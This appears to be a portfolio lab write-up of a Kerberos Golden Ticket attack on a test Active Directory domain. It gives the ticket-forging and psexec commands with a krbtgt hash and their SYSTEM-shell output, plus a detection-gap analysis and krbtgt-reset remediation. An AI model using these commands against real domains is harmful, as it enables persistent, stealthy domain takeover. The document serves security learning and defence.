# Golden Ticket Attack: Forging Persistent Domain Admin Access

## Overview

This project demonstrates a Golden Ticket attack against the existing `lab.local` Active Directory environment — the natural conclusion to the AD attack chain built in project 8. Where the previous project executed attacks that could be remediated by resetting compromised account passwords, the Golden Ticket represents a fundamentally different threat: **persistence that survives password resets, account deletions, and most standard incident response procedures**.

The attack uses the `krbtgt` account hash captured during the DCSync credential dump to forge a Kerberos Ticket Granting Ticket (TGT) — offline, with no contact with the Domain Controller during the forgery itself — and then uses that forged ticket to authenticate as Domain Administrator and obtain a SYSTEM shell on DC01.

This is project 10 in the portfolio and builds directly on:
- **Project 8** — AD attack lab (Kerberoasting → Password Spray → DCSync → Pass-the-Hash)
- **Project 9** — BloodHound enumeration (krbtgt identified as high-value target)

---

## Why Golden Ticket Is The Most Dangerous AD Attack

Every other attack in the AD chain has a clear remediation path:

| Attack | Remediation |
|---|---|
| Kerberoasting | Reset the service account password |
| Password Spray | Disable the compromised account, reset password |
| DCSync | Reset Domain Admin credentials, revoke sessions |
| Pass-the-Hash | Rotate the compromised NTLM hash |
| **Golden Ticket** | **Reset krbtgt password TWICE — anything less leaves forged tickets valid** |

The Golden Ticket persists because it is signed by the `krbtgt` hash directly. Windows DCs validate Kerberos tickets by checking the cryptographic signature — if the signature is valid (because it was signed with the real krbtgt hash), the ticket is accepted as legitimate regardless of whether the account it claims to belong to exists, has been disabled, or has had its password changed. The DC has no record of the ticket being issued, because it wasn't — it was forged entirely offline.

**The only remediation** is resetting the krbtgt account password twice in succession (the first reset stops new forged tickets from being created; the second invalidates the previous hash still cached in memory). In a real breach, organisations frequently miss this step, leaving attackers with persistent access long after they believe the incident is contained.

**Default ticket validity: 10 years.** Impacket's ticketer sets a 10-year expiry by default — a forged ticket created today would technically remain valid until 2036 unless krbtgt is reset.

---

## Prerequisites

All of the following were captured during Project 8 and required no additional access for this attack:

| Requirement | Value | Source |
|---|---|---|
| krbtgt NT hash | `88933a6959dc13a2f648c974713839bd` | secretsdump (DCSync) |
| Domain SID | `S-1-5-21-3245951017-1155023084-1922090920` | BloodHound / secretsdump output |
| Domain name | `lab.local` | Known |
| Attack machine | Kali Linux 192.168.137.60 | Existing lab |
| Target | DC01 192.168.137.50 | Existing lab |

**No live domain access was required to forge the ticket.** The entire forgery happened offline on Kali using only the captured hash and domain metadata.

---

## Attack Execution

### Step 1 — Forge the Golden Ticket (offline)

```bash
impacket-ticketer \
  -nthash 88933a6959dc13a2f648c974713839bd \
  -domain-sid S-1-5-21-3245951017-1155023084-1922090920 \
  -domain lab.local \
  Administrator
```

**Output:**
```
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for lab.local/Administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in Administrator.ccache
```

The ticket is a standard Kerberos `.ccache` credential cache file. No network traffic was generated — this step ran entirely locally. The DC has no log of this ticket being created because it wasn't involved in creating it.

### Step 2 — Load the ticket and authenticate to DC01

```bash
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass -dc-ip 192.168.137.50 Administrator@dc01.lab.local
```

The `KRB5CCNAME` environment variable tells the Kerberos library to use our forged ticket cache instead of obtaining a real TGT from the DC. The `-k` flag instructs psexec to use Kerberos authentication, and `-no-pass` confirms no password is supplied — the ticket is the only credential.

**Result:**
```
[*] Requesting shares on dc01.lab.local.....
[*] Found writable share ADMIN$
[*] Uploading file qeBHGgRs.exe
[*] Opening SVCManager on dc01.lab.local.....
[*] Creating service Dpve on dc01.lab.local.....
[*] Starting service Dpve.....
Microsoft Windows [Version 10.0.17763.3650]

C:\Windows\system32> whoami
nt authority\system
```

The DC accepted the forged ticket without question. SYSTEM shell obtained on the Domain Controller.


### Step 3 — Confirm domain-wide access

```
C:\Windows\system32> whoami /groups
  BUILTIN\Administrators — Enabled by default, Group owner

C:\Windows\system32> net user /domain
  Administrator  Guest  jsmith  krbtgt  sadmin  svc_sql

C:\Windows\system32> hostname
  DC01
```

- `whoami /groups` confirms `BUILTIN\Administrators` membership — the forged ticket successfully claimed full administrative group membership
- `net user /domain` confirms full AD query access — the shell is running in domain context with DC-level privileges
- `hostname` confirms execution on `DC01` itself, not a local shell


---

## Detection Evidence

### What Wazuh Caught

**Rule 92650 — Level 12 — "New Windows Service Created to start from windows root path"**

| Field | Value | Significance |
|---|---|---|
| Event ID | 7045 | New service installed on DC01 |
| serviceName | `Dpve` | Random 4-char name — psexec signature |
| imagePath | `%systemroot%\\qeBHGgRs.exe` | Random executable name dropped to system root |
| accountName | `LocalSystem` | Service running as SYSTEM |
| computer | `DC01.lab.local` | Confirmed on the Domain Controller |
| MITRE | T1021.002 + T1569.002 | Remote Services (SMB) + Service Execution |
| Tactic | Lateral Movement + Execution | Correctly categorised |


### What Wazuh Did NOT Catch — The Critical Gap

**The Golden Ticket itself generated no Wazuh alert.** The forged TGT was created offline and accepted by the DC's Kerberos implementation as a legitimately signed ticket. From the DC's perspective, this was a valid authentication — the signature checked out.

The specific detection gap:

- **Event ID 4768 (Kerberos TGT Request)** was never generated — because the forged ticket bypasses the TGT request entirely. A legitimate authentication would show this event; a Golden Ticket skips it. The *absence* of 4768 before a successful 4769 (service ticket request) is theoretically a detection signal, but extremely difficult to baseline in practice.
- **Event ID 4624 (Successful Logon)** fired for the psexec authentication but showed Kerberos as the auth package — indistinguishable from a legitimate admin logon without additional context.
- **Event ID 4769 (Service Ticket Request)** fired showing the forged ticket being used to access ADMIN$ — but again looked like legitimate Kerberos traffic.

**What actually triggered the alert** was the psexec *consequence* — the service installation (7045). This is the realistic detection pattern: Golden Ticket authentication is nearly invisible, but the post-exploitation activity it enables is not.

### Realistic Detection Approaches for Golden Tickets

In production environments, Golden Ticket detection relies on heuristics rather than direct signature matching:

- **Ticket lifetime anomaly** — legitimate tickets are issued for 10 hours by default; a 10-year ticket is an immediate indicator. Requires a tool like Microsoft Defender for Identity (formerly ATP) or Crowdstrike that inspects Kerberos ticket metadata.
- **Logon without prior TGT request** — detecting 4769 (service ticket) from a source that has no corresponding 4768 (TGT request) in the same session. Requires correlation across multiple event types.
- **Account anomalies in the PAC** — the Privilege Attribute Certificate in a Golden Ticket can contain claims that don't match Active Directory (e.g., group memberships that don't exist). Modern DCs with PAC validation enabled will reject these — but PAC validation was not enforced in this lab environment.
- **Microsoft Defender for Identity** — the commercial tool specifically designed to detect Kerberos-based attacks including Golden Tickets, by inspecting traffic at the DC level rather than relying on Windows Event Logs alone.

---

## The Complete AD Attack Chain — End to End

This project completes the full post-exploitation narrative started in project 8:

```
[Project 8] jsmith (standard user)
      ↓ Kerberoasting → svc_sql:Summer2024!
      ↓ Password Spray → sadmin (Domain Admin) Pwn3d!
      ↓ DCSync → all domain hashes including krbtgt
      ↓ Pass-the-Hash → SYSTEM on DC01

[Project 10] krbtgt hash (captured above)
      ↓ Golden Ticket forged OFFLINE — no DC contact
      ↓ Forged ticket loaded → psexec -k -no-pass
      ↓ DC accepts forged ticket as legitimate
      ↓ SYSTEM on DC01 — persistent, survives password resets
      ↓ Valid for 10 years by default
```

**Total time from standard user to persistent domain compromise: under 15 minutes.**
**Remediation required: krbtgt password reset TWICE — most organisations miss this.**

---

## Skills Demonstrated

- Golden Ticket attack execution using Impacket ticketer
- Kerberos ticket cache manipulation (`KRB5CCNAME`, `.ccache` format)
- Understanding of Kerberos TGT signing and PAC structure
- Offline credential exploitation — no live DC contact during forgery
- Post-exploitation access verification (whoami /groups, net user /domain)
- Honest detection gap analysis — understanding what was and wasn't caught and why
- MITRE ATT&CK: T1558.001 (Golden Ticket), T1021.002 (Remote Services: SMB), T1569.002 (System Services: Service Execution)

## Limitations and Remediation

- **Lab detection gap:** Wazuh did not catch the Golden Ticket authentication itself — only the psexec service installation consequence. A production environment with Microsoft Defender for Identity or similar DC-level Kerberos inspection would have significantly better coverage.
- **PAC validation:** Modern Windows Server environments with PAC validation enforced (MS-KILE) can reject Golden Tickets where the PAC claims don't match AD — this was not tested in this lab.
- **Remediation:** Reset krbtgt password twice with a minimum 10-hour gap between resets (to allow existing legitimate tickets to expire). Force re-authentication of all domain users. Audit all service accounts and privileged group memberships for unexpected additions made during the compromise window.
